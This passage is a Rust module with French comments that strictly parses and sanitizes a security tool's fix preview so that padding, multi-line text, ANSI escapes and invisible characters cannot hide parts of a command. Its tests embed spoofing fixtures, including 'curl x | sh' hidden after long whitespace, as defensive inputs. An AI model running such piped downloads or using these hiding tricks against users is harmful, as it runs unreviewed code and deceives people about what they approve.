//! L'aperçu d'une correction (`correction --voir <jeton> --json`), relu strictement : la dernière ligne non vide,
//! `{"geste": "voir-correction", "issue": "fait", "apercu": {…}, "accord": "<64 chiffres>"}` avec le code 0, ou
//! `{"geste": "voir-correction", "issue": "refuse", "raison": "…"}` avec un autre code. Tout le reste (un autre
//! geste, un autre jeton que celui demandé, une issue qui contredit le code, un champ manquant, nul ou d'un autre
//! type, un refus sans raison ou avec un accord, une commande vide, des listes trop longues, une forme que Vanguard
//! n'écrit jamais) est illisible : la feuille le dit, et rien n'est montré comme si c'était sûr.
//!
//! Un champ inconnu, à n'importe quel niveau, rend aussi la réponse illisible : l'accord engage tout ce que Vanguard
//! a écrit, et un champ ajouté de son côté que la fenêtre ne connaîtrait pas serait engagé sans avoir été montré.
//!
//! L'accord, Vanguard le calcule sur les textes tels qu'il les a écrits ; la fenêtre les montre nettoyés, chacun
//! sur une seule ligne (un saut de ligne dans le message imiterait la suite de la feuille) et sans longue suite
//! d'espaces (une commande rembourrée cacherait sa fin loin en dessous, dans son cadre). Le nettoyage ne laisse passer
//! que ce que les polices de la fenêtre dessinent (`nettoyage::ENCRE`) : un caractère qui ne dessinerait rien devient
//! « � ». Si le nettoyage a changé un seul caractère d'un texte montré (un piège, une séquence, un signe que les
//! polices n'ont pas, un saut de ligne, des espaces resserrées), `retouche` le dit ; si un texte trop long a été coupé,
//! `coupe` le dit à part (la suite n'est pas montrée). Dans les deux cas, ce qui est montré n'est plus exactement ce
//! que l'accord engage : le prochain lot ne devra pas offrir d'accepter. Chaque texte montré doit aussi avoir au moins
//! un signe dessiné (`nettoyage::lisible`) : une commande, un message ou une raison faits seulement de blancs,
//! d'invisibles ou de « � » se montreraient vides. Une espace en tête est retirée, un « − » (qui se dessine comme
//! « - » dans les commandes) et un « � » écrit tel quel se montrent « � » : tous trois posent `retouche`.
//!
//! La fenêtre dessine chaque texte de Vanguard signe par signe (`dessin::signe_par_signe`), sans ligature : « -> »
//! se montre en deux signes, jamais comme la flèche « → » (vérification de Fable n° 3, A1) ; la liste des signes
//! permis n'a pas deux signes qui se dessinent pareil (`nettoyage::ENCRE`, essais de `dessin::encre`).
//!
//! Limites connues : une lettre sosie d'un autre alphabet (un « а » cyrillique dans un chemin) se dessine comme la
//! latine, elle passe sans retouche ; des signes presque pareils (« – » et « - ») aussi ; une lettre accentuée écrite
//! d'un bloc ou décomposée (lettre puis accent) se dessine pareil, et deux accents dans un autre ordre aussi.

use serde::Deserialize;

use super::bilan::Gravite;
use crate::commandes::{Accord, Empreinte};

/// Lignes de commande montrées au plus (une correction de Vanguard en a quelques-unes).
pub const COMMANDES_MAX: usize = 64;
/// Valeurs d'avant montrées au plus.
pub const AVANT_MAX: usize = 64;
/// Longueur d'un nom court (règle, catégorie), en caractères.
const NOM_MAX: usize = 80;
/// Longueur d'une commande ou d'une valeur d'avant, en caractères : bien plus que la ligne de la console (400), pour
/// que la fin d'une commande, souvent ce qui compte, soit montrée ; au-delà, coupée et dit (`coupe`).
const LIGNE_APERCU_MAX: usize = crate::nettoyage::TEXTE_MAX;
/// Espaces de suite gardées au plus dans un texte montré : assez pour un alignement, trop peu pour pousser la suite
/// d'une commande hors de la vue.
pub const ESPACES_MAX: usize = 3;
/// Longueur d'une raison de refus, en caractères : la plus longue de Vanguard en a 179 ; au-delà, ce n'est pas la
/// sienne.
const RAISON_MAX: usize = 200;

/// Qui fera la correction, jugé par Vanguard (`machine::Droits`).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Droits {
    /// Les droits du compte, sans élévation.
    Compte,
    /// Les droits d'administrateur (une fenêtre de mot de passe).
    Admin,
    /// Elle pose une question : elle se fait dans le terminal.
    Terminal,
}

impl Droits {
    fn lire(mot: &str) -> Option<Droits> {
        match mot {
            "compte" => Some(Droits::Compte),
            "admin" => Some(Droits::Admin),
            "terminal" => Some(Droits::Terminal),
            _ => None,
        }
    }
}

/// Une valeur d'avant relevée : ce qui serait changé (« droits:/home/alice/.ssh ») et sa valeur (absente : `None`).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Avant {
    pub geste: String,
    pub valeur: Option<String>,
}

/// L'aperçu prêt à montrer : chaque texte nettoyé et borné. Ses booléens sont des faits indépendants dits par
/// Vanguard (automatique, annulable, point de restauration) et un par la fenêtre (retouche) : pas une machine à états.
#[derive(Clone, Debug, PartialEq, Eq)]
#[allow(clippy::struct_excessive_bools)]
pub struct Apercu {
    pub version: String,
    pub regle: String,
    pub categorie: String,
    pub gravite: Gravite,
    pub message: String,
    pub action: String,
    pub commandes: Vec<String>,
    /// Faux : à faire soi-même, Vanguard ne donne que la marche à suivre.
    pub automatique: bool,
    pub droits: Droits,
    pub annulable: bool,
    /// Pourquoi elle ne s'annulerait pas ; vide si elle s'annule.
    pub pourquoi_pas: String,
    pub avant: Vec<Avant>,
    pub point_de_restauration: bool,
    /// L'accord de Vanguard sur tout ce qu'il a montré, gardé tel quel.
    pub accord: Accord,
    /// Le nettoyage a changé au moins un texte montré : ce qui est montré n'est plus exactement ce que l'accord engage.
    pub retouche: bool,
    /// Au moins un texte trop long a été coupé : sa suite n'est pas montrée.
    pub coupe: bool,
}

/// Ce que la feuille montre de la réponse.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Lecture {
    Lue(Box<Apercu>),
    /// Vanguard a refusé de montrer (le problème a disparu, deux constats répondent…) : sa raison, nettoyée.
    Refusee(String),
    /// La réponse ne se lit pas comme un aperçu de ce jeton : une raison courte.
    Illisible(String),
}

/// Chaque champ facultatif distingue l'absence (`None`) d'une valeur présente : présent, il doit avoir son type
/// (`null` n'est ni un aperçu ni un accord). Vanguard écrit « fait » avec `raison` vide, `apercu` et `accord`, et
/// « refuse » avec `raison` seule.
#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct ReponseBrute {
    geste: String,
    issue: String,
    #[serde(default, deserialize_with = "present")]
    raison: Option<String>,
    #[serde(default, deserialize_with = "present")]
    apercu: Option<ApercuBrut>,
    #[serde(default, deserialize_with = "present")]
    accord: Option<String>,
}

/// Tous les champs sont exigés, avec leur type, et seulement eux : un champ absent, d'un autre type ou inconnu rend la
/// réponse illisible.
#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct ApercuBrut {
    version: String,
    langue: String,
    jeton: String,
    cle: String,
    regle: String,
    categorie: String,
    niveau: String,
    message: String,
    action: String,
    commandes: Vec<String>,
    automatique: bool,
    droits: String,
    annulable: bool,
    pourquoi_pas: String,
    avant: Vec<AvantBrut>,
    point_de_restauration: bool,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct AvantBrut {
    geste: String,
    // Présente, même nulle : un champ oublié n'est pas une valeur « absente » (serde le prendrait pour `None`).
    #[serde(deserialize_with = "presente")]
    valeur: Option<String>,
}

/// Une valeur nulle ou un texte ; sans `default`, serde refuse le champ manquant.
fn presente<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Option<String>, D::Error> {
    <Option<String> as Deserialize>::deserialize(d)
}

/// Un champ présent, lu avec son type (`null` refusé) ; avec `default`, son absence donne `None`.
fn present<'de, D: serde::Deserializer<'de>, T: Deserialize<'de>>(d: D) -> Result<Option<T>, D::Error> {
    T::deserialize(d).map(Some)
}

/// La gravité, aux quatre mots exacts de Vanguard (ici, un autre mot n'est pas « moyen » : il est illisible).
fn gravite(mot: &str) -> Option<Gravite> {
    matches!(mot, "Info" | "Moyen" | "Eleve" | "Critique")
        .then(|| Gravite::lire(mot))
        .flatten()
}

/// Lit la réponse de `correction --voir <jeton> --json`, pour ce jeton-là et ce code de sortie.
pub fn lire(jeton: Empreinte, code: Option<i32>, sortie: &[u8]) -> Lecture {
    let illisible = |raison: &str| Lecture::Illisible(raison.to_string());
    // La dernière ligne non vide : Vanguard a pu écrire avant elle (un avertissement).
    let Some(ligne) = sortie
        .split(|o| *o == b'\n')
        .rev()
        .find(|l| !l.iter().all(u8::is_ascii_whitespace))
    else {
        return illisible(crate::tr!("Vanguard n'a rien répondu", "Vanguard gave no answer"));
    };
    let Ok(b) = super::lire::<ReponseBrute>(ligne) else {
        return illisible(crate::tr!(
            "réponse de Vanguard illisible",
            "unreadable answer from Vanguard"
        ));
    };
    if b.geste != "voir-correction" {
        return illisible(crate::tr!("réponse d'un autre geste", "answer for another action"));
    }
    let contradictoire = || {
        illisible(crate::tr!(
            "réponse de Vanguard contradictoire",
            "contradictory answer from Vanguard"
        ))
    };
    match (b.issue.as_str(), code, b.raison, b.apercu, b.accord) {
        ("fait", Some(0), Some(raison), Some(a), Some(accord)) if raison.is_empty() => apercu(jeton, &a, &accord)
            .map_or_else(
                || {
                    illisible(crate::tr!(
                        "aperçu de Vanguard mal formé",
                        "malformed preview from Vanguard"
                    ))
                },
                |a| Lecture::Lue(Box::new(a)),
            ),
        // Un refus sans raison lisible laisserait la feuille dire « Pas d'aperçu : » suivi de rien. Les raisons de
        // Vanguard sont des phrases fixes (`machine::apercu::Refus`), sans nom venu de l'extérieur, de moins de
        // `RAISON_MAX` signes : une raison que le nettoyage doit changer (un piège, un signe que les polices n'ont pas,
        // un saut de ligne, une espace en tête ou des espaces en trop), qui contient « � », ou qu'il faudrait couper
        // (vérification de Fable n° 3, A6) n'est pas la sienne. Plutôt que de la montrer retouchée ou coupée, la
        // réponse est dite contradictoire.
        ("refuse", Some(c), Some(raison), None, None) if c != 0 => {
            if crate::nettoyage::lisible(&raison)
                && montre(&raison) == raison
                && !raison.contains('\u{fffd}')
                && raison.chars().count() <= RAISON_MAX
            {
                Lecture::Refusee(raison)
            } else {
                contradictoire()
            }
        }
        _ => contradictoire(),
    }
}

/// Un texte de Vanguard tel que la feuille le montre : nettoyé sur une seule ligne, sans espace en tête ni en bout
/// (une espace de tête décalerait une commande sans que rien ne le dise), chaque longue suite d'espaces resserrée, et
/// les jumeaux gardés (`nettoyage::JUMEAUX_GARDES` : « − » se dessine comme « - » dans les commandes) en « � ».
fn montre(texte: &str) -> String {
    resserrer(crate::nettoyage::ligne_entiere(texte).trim_start())
        .chars()
        .map(|c| {
            if crate::nettoyage::JUMEAUX_GARDES.contains(&c) {
                '\u{fffd}'
            } else {
                c
            }
        })
        .collect()
}

/// Resserre chaque suite de plus de `ESPACES_MAX` espaces (le nettoyage a déjà fait des tabulations et des espaces
/// trompeuses des espaces ordinaires).
fn resserrer(texte: &str) -> String {
    let mut suite = 0usize;
    texte
        .chars()
        .filter(|&c| {
            suite = if c == ' ' { suite + 1 } else { 0 };
            suite <= ESPACES_MAX
        })
        .collect()
}

/// Une valeur d'avant de la forme que Vanguard écrit : le geste a l'une des formes qu'une correction de Vanguard note
/// (`optimiser::annulables::Geste`). Les formes : `ntp` et `alimentation` seuls ; `droits|` et `fichier|` suivis d'un
/// chemin absolu ; `defense|` suivi de 16 chiffres hexadécimaux minuscules (`IdNote`) ; `unite|`, `sysctl|`,
/// `module|`, `service|` et `defender|` suivis d'un nom ASCII sans espace. Une seule barre, une cible jamais vide. Le
/// registre (`registre|…|…|…`) n'y est pas : seuls les réglages pour jouer le notent, jamais une correction.
///
/// Le chemin, lui, est un nom de fichier : il peut contenir un guillemet, un chevron ou un signe égal. Le geste et la
/// valeur sont montrés chacun dans un cadre que la fenêtre dessine (`dessin::bilan::correction`), jamais entre des
/// guillemets écrits dans le texte : un nom de fichier ne peut pas y imiter une seconde valeur, il se montre tel quel
/// (vérification de Fable n° 3, A3 : un nom de clé « id_«x» » rendait l'aperçu illisible alors que Vanguard offre la
/// correction et que le terminal la montre).
fn avant_lisible(v: &AvantBrut) -> bool {
    let geste = v.geste.as_str();
    match geste.split_once('|') {
        None => matches!(geste, "ntp" | "alimentation"),
        Some((_, cible)) if cible.is_empty() || cible.contains('|') => false,
        Some(("droits" | "fichier", chemin)) => chemin.starts_with('/'),
        Some(("defense", id)) => id.len() == 16 && id.bytes().all(|o| matches!(o, b'0'..=b'9' | b'a'..=b'f')),
        Some(("unite" | "sysctl" | "module" | "service" | "defender", nom)) => nom
            .bytes()
            .all(|o| o.is_ascii_alphanumeric() || matches!(o, b'-' | b'_' | b'.' | b'@' | b':' | b'/')),
        Some(_) => false,
    }
}

/// Les formes que Vanguard écrit (`machine::apercu::apercu_de`), et seulement elles : annulable, sans « pourquoi
/// pas » et avec ses valeurs d'avant ; sinon, avec un « pourquoi pas » et sans valeur d'avant. Automatique, avec des
/// commandes ; sinon, jamais avec les droits du compte (rien n'est fait sans commande). Chaque texte montré a un
/// signe dessiné (`nettoyage::lisible`) : vide, il se montrerait comme rien (un cadre de commande vide).
fn coherent(a: &ApercuBrut, droits: Droits) -> bool {
    let lisible = |t: &String| crate::nettoyage::lisible(t);
    let annulation = if a.annulable {
        a.pourquoi_pas.is_empty() && !a.avant.is_empty()
    } else {
        lisible(&a.pourquoi_pas) && a.avant.is_empty()
    };
    let geste = if a.automatique {
        !a.commandes.is_empty()
    } else {
        droits != Droits::Compte
    };
    annulation
        && geste
        && [&a.version, &a.regle, &a.categorie, &a.message, &a.action]
            .into_iter()
            .all(lisible)
        && a.commandes.iter().all(lisible)
}

/// L'aperçu, strictement : le jeton demandé, une langue, une gravité et des droits connus, un accord de 64 chiffres,
/// des listes bornées. Chaque texte est nettoyé ; un texte changé par le nettoyage pose `retouche`.
fn apercu(jeton: Empreinte, a: &ApercuBrut, accord: &str) -> Option<Apercu> {
    let accord = Accord::lire(accord)?;
    if Empreinte::lire(&a.jeton)? != jeton || !matches!(a.langue.as_str(), "fr" | "en") {
        return None;
    }
    if a.commandes.len() > COMMANDES_MAX || a.avant.len() > AVANT_MAX || !a.avant.iter().all(avant_lisible) {
        return None;
    }
    // La clé n'est pas montrée (elle nomme l'objet, déjà dans le message) : seulement bornée.
    if a.cle.chars().count() > crate::nettoyage::TEXTE_MAX {
        return None;
    }
    let gravite = gravite(&a.niveau)?;
    let droits = Droits::lire(&a.droits)?;
    if !coherent(a, droits) {
        return None;
    }
    // Nettoyé et resserré d'abord, coupé ensuite : chaque écart compté à part (un piège retiré, une suite non
    // montrée). Chaque texte tient sur une ligne : ceux de Vanguard pour une correction n'ont pas de saut de ligne.
    // Un « � » écrit tel quel par Vanguard se montre comme un caractère remplacé : la feuille ne peut pas dire lequel
    // des deux, elle le dit retouché (vérification de Fable n° 3, A6).
    let (mut retouche, mut coupe) = (false, false);
    let mut propre = |s: &str, max: usize| {
        let e = montre(s);
        retouche |= e != s || s.contains('\u{fffd}');
        coupe |= e.chars().count() > max;
        crate::nettoyage::couper(&e, max)
    };
    let (version, regle, categorie) = (
        propre(&a.version, NOM_MAX),
        propre(&a.regle, NOM_MAX),
        propre(&a.categorie, NOM_MAX),
    );
    let max = crate::nettoyage::TEXTE_MAX;
    let message = propre(&a.message, max);
    let action = propre(&a.action, max);
    let pourquoi_pas = propre(&a.pourquoi_pas, max);
    let commandes: Vec<String> = a.commandes.iter().map(|c| propre(c, LIGNE_APERCU_MAX)).collect();
    let avant: Vec<Avant> = a
        .avant
        .iter()
        .map(|v| Avant {
            geste: propre(&v.geste, LIGNE_APERCU_MAX),
            valeur: v.valeur.as_deref().map(|t| propre(t, LIGNE_APERCU_MAX)),
        })
        .collect();
    Some(Apercu {
        version,
        regle,
        categorie,
        gravite,
        message,
        action,
        commandes,
        automatique: a.automatique,
        droits,
        annulable: a.annulable,
        pourquoi_pas,
        avant,
        point_de_restauration: a.point_de_restauration,
        accord,
        retouche,
        coupe,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    const JETON: &str = "0123456789abcdef0123456789abcdef";

    fn jeton() -> Empreinte {
        Empreinte::lire(JETON).unwrap()
    }

    fn apercu_json() -> serde_json::Value {
        serde_json::json!({
            "version": "0.99.0", "langue": "fr", "jeton": JETON, "cle": "/home/alice/.ssh", "regle": "SSH-002",
            "categorie": "SSH", "niveau": "Moyen", "message": "Le dossier ~/.ssh est lisible par d'autres comptes.",
            "action": "Retirer la lecture aux autres comptes", "commandes": ["chmod 700 /home/alice/.ssh"],
            "automatique": true, "droits": "compte", "annulable": true, "pourquoi_pas": "",
            "avant": [{"geste": "droits|/home/alice/.ssh", "valeur": "755"}, {"geste": "ntp", "valeur": null}],
            "point_de_restauration": false
        })
    }

    /// Une correction qui ne s'annule pas, comme Vanguard l'écrit : sa raison, aucune valeur d'avant.
    fn non_annulable() -> serde_json::Value {
        let mut a = apercu_json();
        a["annulable"] = serde_json::json!(false);
        a["pourquoi_pas"] = serde_json::json!("Vanguard ne sait pas relever l'état d'avant de cette correction");
        a["avant"] = serde_json::json!([]);
        a
    }

    fn lu(a: &serde_json::Value) -> Lecture {
        lire(jeton(), Some(0), &reponse(a))
    }

    fn reponse(apercu: &serde_json::Value) -> Vec<u8> {
        let v = serde_json::json!({
            "geste": "voir-correction", "issue": "fait", "raison": "", "apercu": apercu, "accord": "ab".repeat(32)
        });
        format!("un avertissement\n{v}\n\n").into_bytes()
    }

    /// Une réponse bien formée se lit entière, les textes tels quels, sans retouche.
    #[test]
    fn un_apercu_bien_forme_se_lit_entier() {
        let Lecture::Lue(a) = lire(jeton(), Some(0), &reponse(&apercu_json())) else {
            panic!("pas lu");
        };
        assert_eq!(a.regle, "SSH-002");
        assert_eq!(a.gravite, Gravite::Moyenne);
        assert_eq!(a.droits, Droits::Compte);
        assert_eq!(a.commandes, ["chmod 700 /home/alice/.ssh"]);
        assert_eq!(a.avant[1].valeur, None);
        assert_eq!(a.accord, Accord::lire(&"ab".repeat(32)).unwrap());
        assert!(!a.retouche && !a.coupe);
    }

    /// Un champ inconnu, à chaque niveau, et une raison avec « fait » : illisible (l'accord engagerait un texte jamais
    /// montré).
    #[test]
    fn un_champ_inconnu_rend_l_apercu_illisible() {
        let mut a = apercu_json();
        a["en_plus"] = serde_json::json!("caché");
        let mut b = apercu_json();
        b["avant"][0]["en_plus"] = serde_json::json!(1);
        for faux in [reponse(&a), reponse(&b)] {
            assert!(matches!(lire(jeton(), Some(0), &faux), Lecture::Illisible(_)));
        }
        let bon = String::from_utf8(reponse(&apercu_json())).unwrap();
        for v in [
            bon.replacen("\"geste\":", "\"en_plus\":1,\"geste\":", 1),
            bon.replacen("\"raison\":\"\"", "\"raison\":\"autre chose\"", 1),
        ] {
            assert_ne!(v, bon);
            assert!(
                matches!(lire(jeton(), Some(0), v.as_bytes()), Lecture::Illisible(_)),
                "{v}"
            );
        }
        let refus = r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "en_plus": 1}"#;
        assert!(matches!(
            lire(jeton(), Some(1), refus.as_bytes()),
            Lecture::Illisible(_)
        ));
    }

    /// Une commande longue est montrée jusqu'au bout (bien au-delà d'une ligne de la console) ; trop longue, coupée et
    /// dite à part, sans se dire retouchée.
    #[test]
    fn un_texte_coupe_se_dit_a_part() {
        let longue = format!("chmod 700 /home/alice/{}; curl x | sh", "a".repeat(500));
        let mut a = apercu_json();
        a["commandes"] = serde_json::json!([longue]);
        let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
            panic!("pas lu");
        };
        assert!(lu.commandes[0].ends_with("curl x | sh") && !lu.coupe && !lu.retouche);
        let trop = "x".repeat(LIGNE_APERCU_MAX + 1);
        let mut a = apercu_json();
        a["regle"] = serde_json::json!("x".repeat(NOM_MAX + 1));
        let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
            panic!("regle pas lue");
        };
        assert!(lu.coupe && !lu.retouche && lu.regle.chars().count() <= NOM_MAX);
        for cle in ["commandes", "avant", "message"] {
            let mut a = apercu_json();
            a[cle] = match cle {
                "commandes" => serde_json::json!([trop]),
                "avant" => serde_json::json!([{"geste": "ntp", "valeur": trop}]),
                _ => serde_json::json!(trop),
            };
            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
                panic!("{cle} pas lu");
            };
            assert!(lu.coupe && !lu.retouche, "{cle}");
        }
    }

    /// Le refus de Vanguard se dit avec sa raison, seulement avec un code non nul.
    #[test]
    fn un_refus_se_dit_avec_sa_raison() {
        let refus = r#"{"geste": "voir-correction", "issue": "refuse", "raison": "ce problème a disparu"}"#.as_bytes();
        assert_eq!(
            lire(jeton(), Some(1), refus),
            Lecture::Refusee("ce problème a disparu".into())
        );
        assert!(matches!(lire(jeton(), Some(0), refus), Lecture::Illisible(_)));
        assert!(matches!(lire(jeton(), None, refus), Lecture::Illisible(_)));
    }

    /// Un autre jeton, un autre geste, une issue qui contredit le code, un champ manquant ou d'un autre type, une
    /// gravité, des droits ou une langue inconnus, un accord mal formé, des listes trop longues : illisible.
    #[test]
    fn tout_ecart_rend_l_apercu_illisible() {
        let mut faux: Vec<serde_json::Value> = Vec::new();
        for (cle, valeur) in [
            ("jeton", serde_json::json!("f".repeat(32))),
            ("jeton", serde_json::json!(JETON.to_uppercase())),
            ("langue", serde_json::json!("de")),
            ("niveau", serde_json::json!("Grave")),
            ("droits", serde_json::json!("root")),
            ("automatique", serde_json::json!("oui")),
            ("commandes", serde_json::json!("chmod 700 ~")),
            ("commandes", serde_json::json!(vec!["x"; COMMANDES_MAX + 1])),
            (
                "avant",
                serde_json::json!(vec![serde_json::json!({"geste": "x", "valeur": null}); AVANT_MAX + 1]),
            ),
            ("avant", serde_json::json!([{"geste": "x"}])),
            ("message", serde_json::json!(7)),
        ] {
            let mut a = apercu_json();
            a[cle] = valeur;
            faux.push(a);
        }
        for champ in [
            "version",
            "cle",
            "message",
            "commandes",
            "droits",
            "annulable",
            "point_de_restauration",
        ] {
            let mut a = apercu_json();
            a.as_object_mut().unwrap().remove(champ);
            faux.push(a);
        }
        for a in &faux {
            assert!(
                matches!(lire(jeton(), Some(0), &reponse(a)), Lecture::Illisible(_)),
                "{a}"
            );
        }
        let bon = reponse(&apercu_json());
        assert!(matches!(lire(jeton(), Some(1), &bon), Lecture::Illisible(_)));
        let texte = String::from_utf8(bon).unwrap();
        for (de, vers) in [
            ("\"voir-correction\"", "\"retirer\""),
            ("\"fait\"", "\"refuse\""),
            (&"ab".repeat(32), &"ab".repeat(31)),
            (&"ab".repeat(32), &"AB".repeat(32)),
        ] {
            let v = texte.replacen(de, vers, 1);
            assert!(
                matches!(lire(jeton(), Some(0), v.as_bytes()), Lecture::Illisible(_)),
                "{v}"
            );
        }
        for rien in [&b""[..], b"\n\n", b"[1]", b"{\"geste\": 7}"] {
            assert!(matches!(lire(jeton(), Some(0), rien), Lecture::Illisible(_)));
        }
    }

    /// Vérification de Fable, F1 : une commande rembourrée d'espaces (sous la borne, rien de coupé) cacherait sa suite
    /// loin en dessous dans son cadre. Les espaces sont resserrées, la suite reste à côté, et l'aperçu se dit retouché ;
    /// quelques espaces de suite (un alignement) ne changent rien.
    #[test]
    fn une_commande_rembourree_est_resserree_et_dite() {
        for (cle, blanc) in [
            ("commandes", " "),
            ("commandes", "\t"),
            ("message", "\u{a0}"),
            ("action", " "),
        ] {
            let mut a = apercu_json();
            let piege = format!("chmod 700 /home/alice/.ssh{}; curl x | sh", blanc.repeat(3900));
            a[cle] = if cle == "commandes" {
                serde_json::json!([piege])
            } else {
                serde_json::json!(piege)
            };
            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
                panic!("{cle} pas lu");
            };
            let montre = if cle == "commandes" {
                &lu.commandes[0]
            } else if cle == "message" {
                &lu.message
            } else {
                &lu.action
            };
            assert_eq!(
                montre,
                &format!("chmod 700 /home/alice/.ssh{}; curl x | sh", " ".repeat(ESPACES_MAX))
            );
            assert!(lu.retouche && !lu.coupe, "{cle}");
        }
        let mut a = apercu_json();
        a["commandes"] = serde_json::json!(["a   b"]);
        let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
            panic!("pas lu");
        };
        assert_eq!(lu.commandes, ["a   b"]);
        assert!(!lu.retouche);
    }

    /// Vérification de Fable, F2 : un message, une action ou une raison de non-annulation à plusieurs lignes
    /// imiteraient la suite de la feuille (« S'annule », « Commandes ») ; chacun est montré sur une seule ligne, et
    /// l'aperçu se dit retouché.
    #[test]
    fn un_texte_a_plusieurs_lignes_tient_sur_une_et_se_dit() {
        for cle in ["message", "action", "pourquoi_pas"] {
            let mut a = if cle == "pourquoi_pas" {
                non_annulable()
            } else {
                apercu_json()
            };
            a[cle] = serde_json::json!("Retirer la lecture\n\nS'annule : oui\r\nCommandes");
            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
                panic!("{cle} pas lu");
            };
            for t in [&lu.message, &lu.action, &lu.pourquoi_pas] {
                assert!(!t.contains(['\n', '\r']), "{cle} : {t:?}");
            }
            assert!(lu.retouche, "{cle}");
        }
    }

    /// Vérification de Fable, F4 : un refus avec un accord, un aperçu nul ou une raison absente, vide ou faite
    /// seulement d'une séquence ; un « fait » sans raison ou avec un accord nul ; une commande vide ; une valeur d'avant
    /// dont le geste n'a pas la forme de Vanguard : illisible. Un nom de fichier qui a l'air d'une seconde valeur, lui,
    /// se lit : la fenêtre montre le geste et la valeur dans deux cadres (vérification de Fable n° 3, A3).
    #[test]
    fn les_petits_ecarts_rendent_la_reponse_illisible() {
        for refus in [
            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "accord": ""}"#,
            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "accord": null}"#,
            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "apercu": null}"#,
            r#"{"geste": "voir-correction", "issue": "refuse"}"#,
            r#"{"geste": "voir-correction", "issue": "refuse", "raison": ""}"#,
            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "  "}"#,
            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "\u001b[2K"}"#,
            r#"{"geste": "voir-correction", "issue": "refuse", "raison": null}"#,
        ] {
            assert!(
                matches!(lire(jeton(), Some(1), refus.as_bytes()), Lecture::Illisible(_)),
                "{refus}"
            );
        }
        let entiere = || {
            serde_json::json!({
                "geste": "voir-correction", "issue": "fait", "raison": "", "apercu": apercu_json(),
                "accord": "ab".repeat(32)
            })
        };
        let (mut sans_raison, mut accord_nul, mut raison_nulle) = (entiere(), entiere(), entiere());
        sans_raison.as_object_mut().unwrap().remove("raison");
        accord_nul["accord"] = serde_json::Value::Null;
        raison_nulle["raison"] = serde_json::Value::Null;
        assert!(matches!(
            lire(jeton(), Some(0), entiere().to_string().as_bytes()),
            Lecture::Lue(_)
        ));
        for v in [sans_raison, accord_nul, raison_nulle] {
            assert!(
                matches!(lire(jeton(), Some(0), v.to_string().as_bytes()), Lecture::Illisible(_)),
                "{v}"
            );
        }
        let mut faux = Vec::new();
        for commandes in [
            serde_json::json!([""]),
            serde_json::json!(["  "]),
            serde_json::json!(["chmod 700 ~", "\u{1b}[2K"]),
        ] {
            let mut a = apercu_json();
            a["commandes"] = commandes;
            faux.push(a);
        }
        for avant in [
            serde_json::json!([{"geste": "droits|/home/alice/a = «x»", "valeur": "755"}]),
            serde_json::json!([{"geste": "droits|/home/alice/.ssh", "valeur": "755» = «700"}]),
        ] {
            let mut a = apercu_json();
            a["avant"] = avant;
            let Lecture::Lue(l) = lu(&a) else {
                panic!("{a} pas lu");
            };
            assert!(!l.retouche && !l.coupe, "{a}");
        }
        for avant in [
            serde_json::json!([{"geste": "Droits|/home/alice/.ssh", "valeur": "755"}]),
            serde_json::json!([{"geste": "|/home/alice/.ssh", "valeur": "755"}]),
            serde_json::json!([{"geste": "", "valeur": null}]),
            serde_json::json!([{"geste": "droits:/home/alice/.ssh", "valeur": "755"}]),
        ] {
            let mut a = apercu_json();
            a["avant"] = avant;
            faux.push(a);
        }
        for a in &faux {
            assert!(
                matches!(lire(jeton(), Some(0), &reponse(a)), Lecture::Illisible(_)),
                "{a}"
            );
        }
    }

    /// Un texte piégé est montré nettoyé, et l'aperçu se dit retouché.
    #[test]
    fn un_texte_piege_est_nettoye_et_dit() {
        for (cle, piege) in [
            ("message", serde_json::json!("Tout va bien\u{1b}[2K\u{202e}")),
            ("commandes", serde_json::json!(["chmod 700 ~\u{200b}"])),
            (
                "avant",
                serde_json::json!([{"geste": "droits|/home/alice/a\nb", "valeur": "1"}]),
            ),
            ("regle", serde_json::json!("LNX\u{1b}[31m-001")),
        ] {
            let mut a = apercu_json();
            a[cle] = piege;
            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
                panic!("{cle} pas lu");
            };
            assert!(lu.retouche, "{cle}");
            for t in std::iter::once(&lu.message)
                .chain(&lu.commandes)
                .chain(lu.avant.iter().map(|v| &v.geste))
            {
                assert!(
                    !t.contains('\u{1b}') && !t.contains('\u{202e}') && !t.contains('\u{200b}'),
                    "{t:?}"
                );
            }
            assert!(lu.avant.iter().all(|v| !v.geste.contains('\n')));
        }
    }

    /// Vérification n° 2 de Fable, P1 : un caractère que les polices ne dessinent pas, absent des anciennes listes de
    /// pièges (un caractère de format, une marque sans glyphe, un hiéroglyphe de format, un point de code non attribué
    /// ou privé), ne passe plus tel quel : il se montre « � » et l'aperçu se dit retouché. Une commande, un message, une
    /// action, une règle ou un « pourquoi pas » faits seulement de ces caractères sont illisibles (ils se montreraient
    /// vides) ; une espace sur deux ne se cache plus entre eux.
    #[test]
    fn un_caractere_qui_ne_dessine_rien_se_voit_et_se_dit() {
        for rien in [
            '\u{2065}',
            '\u{1d173}',
            '\u{110bd}',
            '\u{13430}',
            '\u{378}',
            '\u{e000}',
            '\u{f0000}',
        ] {
            let mut a = apercu_json();
            a["commandes"] = serde_json::json!([format!("chmod 600 /home/alice/.ssh/id{rien}_a")]);
            a["message"] = serde_json::json!(format!("Sa{rien}lon"));
            let Lecture::Lue(l) = lu(&a) else {
                panic!("U+{:04X} pas lu", u32::from(rien));
            };
            assert_eq!(l.commandes, ["chmod 600 /home/alice/.ssh/id\u{fffd}_a"]);
